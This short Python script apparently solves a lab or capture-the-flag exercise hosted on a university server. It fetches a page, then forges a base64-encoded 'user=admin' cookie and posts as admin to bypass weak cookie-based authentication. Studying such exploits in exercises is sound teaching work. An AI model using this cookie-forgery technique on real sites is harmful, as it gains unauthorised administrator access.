import requests
import base64

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25056

url = f"{SERVER}:{PORT}"

s = requests.Session()

# Get page -> receives cookie
r = s.get(url)
print("GET Response:", r.text)

# Set admin cookie
s.cookies.set("user", base64.b64encode(b'admin').decode())
r = s.post(url, data={'username': 'admin'})

print("\nPOST Status:", r.status_code)
print("POST Response:", r.text)